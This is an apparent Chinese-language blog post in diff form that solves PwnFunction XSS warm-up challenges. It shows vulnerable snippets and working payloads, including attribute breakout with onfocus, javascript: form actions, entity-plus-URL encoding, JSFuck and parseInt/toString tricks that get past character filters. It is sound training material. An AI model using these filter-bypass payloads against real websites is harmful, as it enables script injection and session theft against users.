placeholder=&quot;<span class="subst">$&#123;wey&#125;</span>&quot; class=&quot;form-control&quot;&gt;`</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="知识清单：-2"><a href="#知识清单：-2" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
+<li><p>placeholder 属性提供输入字段预期值的提示信息（hint）。该提示会在输入字段为空时显示，并会在字段获得焦点时消失。</p>
+</li>
+<li><p>HTML DOM属性对象 onfocus事件：当 input 输入框获取焦点时执行一段 Javascript代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onfocus=&quot;myFunction()&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>autofocus属性</p>
+<p>autofocus 属性规定当页面加载时 input 元素应该自动获得焦点。</p>
+<p>如果使用该属性，则 input 元素会获得焦点。</p>
+</li>
+</ol>
+<h4 id="解决方法：-2"><a href="#解决方法：-2" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><p>从代码分析可以看到，wey被插入到input元素的属性中。由于对尖括号进行了过滤，则无法使用尖括号对input标签进行闭合，那么可以尝试用双引号闭合内部属性。</p>
+<p>并添加onfocus属性来触发alert函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源URL：https://sandbox.pwnfunction.com/warmups/da-wey.html</span><br><span class="line"></span><br><span class="line">修改后URL：https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=here is placeholder&quot; onfocus=&quot;alert(1337);&quot; autofocus=&quot;autofocus</span><br></pre></td></tr></table></figure>
+
+<img src="D:\blog\H01iday\source\_posts\pics\xss game8.png" alt="xss game9" style="zoom:80%;" />
+
+<p>一开始：</p>
+<p>![xss game9](D:\blog\H01iday\source_posts\pics\xss game9.png)</p>
+<p>url插入wey后：</p>
+<p>![xss game7](D:\blog\H01iday\source_posts\pics\xss game7.png)</p>
+<p>【注意：placeholder处不需要填写内容，我写了here is placeholder只是为了方便看，重要的是补的那个<code>&quot;</code>闭合了placeholder的属性；同理，autofocus也不是必要的，加上它只是它可以无需鼠标移动到输入框就可以聚焦到输入框，一直都自动聚焦到输入框；而单纯用onfocus的话需要手动移鼠标到输入框才可以触发alert。最重要的其实是注意格式，把<code>&quot;</code>双引号闭合了即可。】</p>
+<p>【如果是html的属性内容，且过滤掉&lt;&gt;等敏感字符，那么可以通过” “,添加新的属性如onfocus等，利用新的属性来执行js代码】</p>
+<h1 id="4-Ricardo-Milos"><a href="#4-Ricardo-Milos" class="headerlink" title="4.Ricardo Milos"></a>4.Ricardo Milos</h1><ul>
+<li>Difficulty is <strong>Easy</strong>.</li>
+<li>Pop an <code>alert(1337)</code> on <code>https://sandbox.pwnfunction.com/warmups/ricardo.html</code>.</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;ricardo&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;milos&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;True&quot;</span> <span class="attr">value</span>=<span class="string">&quot;True&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    ricardo.action = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;ricardo&#x27;</span>) || <span class="string">&#x27;#&#x27;</span>)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        ricardo.submit()</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="知识清单：-3"><a href="#知识清单：-3" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
+<li>form的action一般情况下代表提交表单到的页面，如果不填就相当于刷新当前页面。还有一种用法：action=JavaScript:xxxx;代表提交表单时执行xxxx的js代码。</li>
+</ol>
+<h4 id="解决方法：-3"><a href="#解决方法：-3" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">源URL：https://sandbox.pwnfunction.com/warmups/ricardo.html?milos=True#</span><br><span class="line">修改后URL：https://sandbox.pwnfunction.com/warmups/ricardo.html?milos=True#?ricardo=javascript:alert(1337);</span><br></pre></td></tr></table></figure>
+
+<p>一开始，注意action的值</p>
+<p>![xss game10](D:\blog\H01iday\source_posts\pics\xss game10.png)</p>
+<p>修改后：</p>
+<p>![xss game10](D:\blog\H01iday\source_posts\pics\xss game11.png)</p>
+<p>【跟submit相关的可以直接将JavaScript代码当作action，即表单提交的地方，这样也可以直接执行js代码】</p>
+<h1 id="5-Ah-That’s-Hawt"><a href="#5-Ah-That’s-Hawt" class="headerlink" title="5.Ah That’s Hawt"></a>5.Ah That’s Hawt</h1><ul>
+<li><p>Difficulty is <strong>Easy</strong>.</p>
+</li>
+<li><p>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;will&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    smith = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;markassbrownlee&#x27;</span>) || <span class="string">&quot;Ah That&#x27;s Hawt&quot;</span>)</span></span><br><span class="line"><span class="javascript">    smith = smith.replace(<span class="regexp">/[\(\`\)\\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">    will.innerHTML = smith</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="知识清单：-4"><a href="#知识清单：-4" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
+<li>```<br>replace(/[(`)\]/g, ‘’)<br>第一：/pattern/是正则表达式的界定符，里面的内容即为要匹配的内容<br>第二：如果是单纯的replace(/[(`)\]/, ‘’)，只会替换第一个匹配的字符。如果加了g(全局标识)，可以替换掉全部匹配的字符<br>第三：\是转义的意思<br>综上，可以知道这句话的意思是，替换掉全部的 ( ) \ `<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 浏览器解析顺序:URL 解析器-&gt;HTML 解析器-&gt; CSS 解析器-&gt;JS解析器</span><br><span class="line"></span><br><span class="line">#### **解决方法：**</span><br><span class="line"></span><br><span class="line">第一：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+alert(“1337”) ==&gt; 进行HTML实体编码（这里只对两个括号编码） ==&gt; alert&#x28;1337&#x29;”<br>编码网址：<a target="_blank" rel="noopener" href="https://mothereff.in/html-entities">https://mothereff.in/html-entities</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第二：</span><br><span class="line"></span><br><span class="line">到控制台界面</span><br><span class="line"></span><br><span class="line">![hawt1](D:\blog\H01iday\source\_posts\pics\hawt1.png)</span><br><span class="line"></span><br><span class="line">可以看到 onerror的内容不完整</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;D:\blog\H01iday\source\_posts\pics\hawt2.png&quot; alt=&quot;hawt1&quot; style=&quot;zoom:180%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">可以看到在从‘#’开始部分都为hash部分</span><br><span class="line"></span><br><span class="line">原因：1. 从&quot;#&quot;开始到最后，都是锚部分。例如，如果你有一个 id 为 hello 的元素，则可以在 URL 中添加 #hello 就可以直接滚动到这个元素的位置上。</span><br><span class="line"></span><br><span class="line">​			2.?key1=value1&amp;key2=value2  ？后面跟查询参数，都是key-value pair；所以</span><br><span class="line"></span><br><span class="line">```url</span><br><span class="line">?markassbrownlee=&lt;img%20src=x%20onerror=&quot;alert&amp;#x28;1337&amp;#x29;&quot;&gt;</span><br><span class="line">url编码的时候会将&amp;两边的内容当作两个key-value pair 再加上考虑#则如下图所示</span><br></pre></td></tr></table></figure></li>
+</ol>
+<img src="D:\blog\H01iday\source\_posts\pics\hawt3.png" alt="hawt3" style="zoom:180%;" />
+
+<p>综上，所以还需要进行url编码，也是对括号进行编码即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> urlencode(<span class="string">&quot;&amp;#x28;&quot;</span>);<span class="comment">//%26%23x28%3B</span></span><br><span class="line">  <span class="keyword">echo</span> urlencode(<span class="string">&quot;&amp;#x29;&quot;</span>);<span class="comment">//%26%23x29%3B</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\blog\H01iday\source_posts\pics\hawt4.png" alt="hawt4"></p>
+<p><strong>存在的疑惑：</strong></p>
+<p>为什么要先进行html编码在进行url编码？可不可以直接进行url编码</p>
+<p>尝试：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&quot;alert(1337)&quot;</span>);<span class="comment">//alert%281337%29</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\blog\H01iday\source_posts\pics\hawt5.png" alt="hawt5"></p>
+<p>询问老师：</p>
+<p><code>直接url编码不行，因为解码后js判断出来是括号过滤了</code></p>
+<h1 id="6-Ninja-has-Ligma"><a href="#6-Ninja-has-Ligma" class="headerlink" title="6.Ninja has Ligma"></a>6.Ninja has Ligma</h1><ul>
+<li><p>Difficulty is <strong>Easy</strong>.</p>
+</li>
+<li><p>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Challenge */</span></span><br><span class="line">balls = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;balls&#x27;</span>) || <span class="string">&quot;Ninja has Ligma&quot;</span>)</span><br><span class="line">balls = balls.replace(/[A-Za-z0-<span class="number">9</span>]/g, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">eval</span>(balls)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="知识清单：-5"><a href="#知识清单：-5" class="headerlink" title="知识清单："></a><strong>知识清单</strong>：</h4><ol>
+<li><p><em>JSFuck</em> 可以让你只用 6 个字符[]()!+ 来编写 JavaScript 程序。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br><span class="line">==&gt;</span><br><span class="line">JSFuck编码</span><br><span class="line">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure></li>
+<li><p>+号的特别：在用户提交的表单字段，如果有空格，会被转化为+字；服务器解析时会认为+号代表空格</p>
+<p>特殊字符都需要进行url编码，url出现了有+，空格，/，?，%，#，&amp;，=等特殊符号的时候，能在服务器端无法获得正确的参数值</p>
+<p>如+再URL表示空格，那么如果要表示‘+’本身就要通过转义用%2B 来表示加号</p>
+</li>
+</ol>
+<h4 id="解决方法：-4"><a href="#解决方法：-4" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><p>第一：js过滤掉了a-zA-Z0-9所以，没办法直接用alert(1337)</p>
+<p>第二：那么可以通过JSFuck对内容进行alert(1337)部分进行编码</p>
+<img src="D:\blog\H01iday\source\_posts\pics\Ligma1.png" alt="Ligma1" style="zoom:67%;" />
+
+<p>第三：这样还不够，因为JSFuck中含有+号，在URL中+号表示空格，所以为了能正确表示，要对JSFuck之后的内容再进行URL编码</p>
+<img src="D:\blog\H01iday\source\_posts\pics\Ligma2.png" alt="Ligma2" style="zoom: 67%;" />
+
+<p>第四：</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\Ligma3.png" alt="Ligma3"></p>
+<h1 id="7-Mafia"><a href="#7-Mafia" class="headerlink" title="7.Mafia"></a>7.Mafia</h1><ul>
+<li>Difficulty is <strong>Easy</strong>.</li>
+<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
+</ul>
+<p>![xss game12](D:\blog\H01iday\source_posts\pics\xss game12.png)</p>
+<h4 id="知识清单：-6"><a href="#知识清单：-6" class="headerlink" title="知识清单："></a>知识清单：</h4><ul>
+<li><p>​    atob(encodedString)函数</p>
+<p>​    该函数解码base-64编码的<strong>字符串</strong></p>
+</li>
+<li><p>​    String.fromCharCode(unicode)函数</p>
+<p>​    接收unicode值，然后返回字符串</p>
+<p>​    例：</p>
+<img src="D:\blog\H01iday\source\_posts\pics\xss game13.png" alt="xss game13" style="zoom: 67%;" />
+
+<p>​    </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> val=<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>);</span><br><span class="line">	alert(val); <span class="comment">//alert</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>RegExp(pattern,modifiers)对象</p>
+<p>pattern：表达式的模式</p>
+<p>modifiers[修饰符]：指定全局匹配、区分大小写匹配、多行匹配</p>
+<table>
+<thead>
+<tr>
+<th align="left">修饰符</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">i</td>
+<td align="left">执行对大小写不敏感的匹配。</td>
+</tr>
+<tr>
+<td align="left">g</td>
+<td align="left">执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td>
+</tr>
+<tr>
+<td align="left">m</td>
+<td align="left">执行多行匹配。</td>
+</tr>
+</tbody></table>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">var</span> patt=<span class="keyword">new</span> <span class="built_in">RegExp</span>(pattern,modifiers);</span><br><span class="line"><span class="keyword">var</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;\\w+&quot;</span>); 查找数字、字母、下划线至少一个匹配</span><br><span class="line"></span><br><span class="line">或者更简单的方式:</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> patt=<span class="regexp">/pattern/m</span>odifiers;</span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/\w+/</span>;</span><br></pre></td></tr></table></figure></li>
+<li><p>source属性</p>
+<p>RegExpObject.source</p>
+<p>返回[正则]模式匹配所用的文本</p>
+<p>例：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="keyword">var</span> pattern1 = <span class="regexp">/hey/g</span>;</span><br><span class="line">      <span class="built_in">document</span>.write(<span class="string">&quot;The text of the RegExp is: &quot;</span>+pattern1.source);<span class="comment">//output:hey</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>parseInt(string, radix)</p>
+<p>解析字符串，并返回整数</p>
+<p>string：要解析的字符串</p>
+<p>radix：要解析的数字<strong>基数</strong>2-36</p>
+<p>有点抽象，举个栗子</p>
+<p>parseInt(“f”, 16)&gt;&gt;&gt;&gt;15</p>
+<p>就是说f在16进制中代表的整数为15</p>
+</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;alert&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">\\output：<span class="number">8680439</span></span><br><span class="line">解析：</span><br><span class="line"><span class="number">1.</span> 为什么选择<span class="number">30</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;t&#x27;</span>,<span class="number">30</span>)</span><br><span class="line">	\\output:<span class="number">29</span>  要选择一个t有表示值的基数，基数为<span class="number">30</span>时t为最大值<span class="number">29</span>，故要选择基数大于等于<span class="number">30</span>,而且小于<span class="number">36</span>[函数规定]</span><br><span class="line"><span class="number">2.</span> <span class="number">8680439</span>这个值是怎么来的</span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">30</span>):<span class="number">10</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;l&#x27;</span>,<span class="number">30</span>):<span class="number">21</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;e&#x27;</span>,<span class="number">30</span>):<span class="number">14</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;r&#x27;</span>,<span class="number">30</span>):<span class="number">27</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;t&#x27;</span>,<span class="number">30</span>):<span class="number">29</span></span><br><span class="line">	<span class="number">8680439</span>=<span class="number">10</span>*<span class="number">30</span>^<span class="number">4</span>+<span class="number">21</span>*<span class="number">30</span>^<span class="number">3</span>+<span class="number">14</span>*<span class="number">30</span>^<span class="number">2</span>+<span class="number">27</span>*<span class="number">30</span>+<span class="number">29</span>		</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>toString(radix)函数</p>
+<p>number.toString(radix)把数字转化为字符串</p>
+<p>radix：基数</p>
+</li>
+<li><p>url中的#说明</p>
+<p>#锚点：浏览器读取该url时会自动滚动至#指定区域</p>
+<p>#是用来指导浏览器动作的，对服务器端完全无用。HTTP请求中不包括#。即#后的内容不会发送给服务器端</p>
+<p>#内容的修改不会导致页面重新加载，只会切换位置</p>
+<p>#内容的改变会导致浏览器访问历史的改变  即#改变后 点击后退返回的是#改变前的位置</p>
+</li>
+<li><p>number.toString(radix)eval(Function(alert(1337))());这是什么语法？！</p>
+</li>
+</ul>
+<h4 id="解决方法：-5"><a href="#解决方法：-5" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p><del>jsfuck</del> ：[ ]!+都被过滤了</p>
+</li>
+<li><p>unicode有三种表现形式：&amp;#、&amp;#x、\u</p>
+<p>​    \u 开头和 &amp;#x 开头是一样的 都是16进制 unicode字符的不同写法</p>
+<p>​    &amp;# 则是 unicode字符的10进制的写法</p>
+<p>alert==&gt;\u unicode如下</p>
+<p>​        <del>\u0061\u006c\u0065\u0072\u0074</del>因为\被过滤了</p>
+<p>alert==&gt;&amp;# unicode如下</p>
+<p>​        &amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;</p>
+</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> val = <span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>);</span><br><span class="line"><span class="built_in">document</span>.write(val);<span class="comment">//output:alert</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116))(1337)&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.write(str1.length);<span class="comment">//output:51 超过50所以这个方法不行，但是可以成功输出小于四位数值</span></span><br></pre></td></tr></table></figure>
+
+<p>​    <strong>①</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mafia = <span class="built_in">Function</span>(<span class="regexp">/ALERT(1337)/</span>.source.toLowerCase())()</span><br><span class="line">==》相当于 mafia = <span class="built_in">Function</span>(alert(<span class="number">1337</span>))()</span><br><span class="line">==&gt;最后<span class="built_in">eval</span>(<span class="built_in">Function</span>(alert(<span class="number">1337</span>))())</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong>②</strong></p>
+<p>​    将alert用parseInt函数改为用数字表示</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&quot;alert&quot;</span>, <span class="number">30</span>)<span class="comment">//为什么是30上面知识清单有解析</span></span><br><span class="line">》》》<span class="number">8680439</span></span><br><span class="line"></span><br><span class="line"><span class="number">8680439.</span>.toString(<span class="number">30</span>)即为alert</span><br><span class="line"></span><br><span class="line">所以将mafia = <span class="built_in">eval</span>(<span class="number">8680439.</span>.toString(<span class="number">30</span>))(<span class="number">1337</span>)</span><br><span class="line">最后<span class="built_in">eval</span>(mafia) = <span class="built_in">eval</span>(<span class="number">8680439.</span>.toString(<span class="number">30</span>))(<span class="number">1337</span>)) = <span class="built_in">eval</span>(alert(<span class="number">1337</span>))</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong>③</strong></p>
+<p>​    这种方式我觉得是最巧，最容易的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mafia=<span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))#alert(<span class="number">1337</span>)</span><br><span class="line">在控制台上</span><br><span class="line"><span class="built_in">console</span>.log(mafia)</span><br><span class="line">》》》<span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))</span><br><span class="line">最后<span class="built_in">eval</span>(mafia) = <span class="built_in">eval</span>(<span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))) = <span class="built_in">eval</span>(alert(<span class="number">1337</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="8-Ok-Boomer"><a href="#8-Ok-Boomer" class="headerlink" title="8.Ok, Boomer"></a>8.Ok, Boomer</h1><h4 id="知识清单：-7"><a href="#知识清单：-7" class="headerlink" title="知识清单："></a>知识清单：</h4><p>​    </p>
+<h4 id="解决方法：-6"><a href="#解决方法：-6" class="headerlink" title="解决方法："></a>解决方法：</h4><h4 id=""><a href="#" class="headerlink" title=""></a></h4>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/13/XSS-steal%20cookies/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
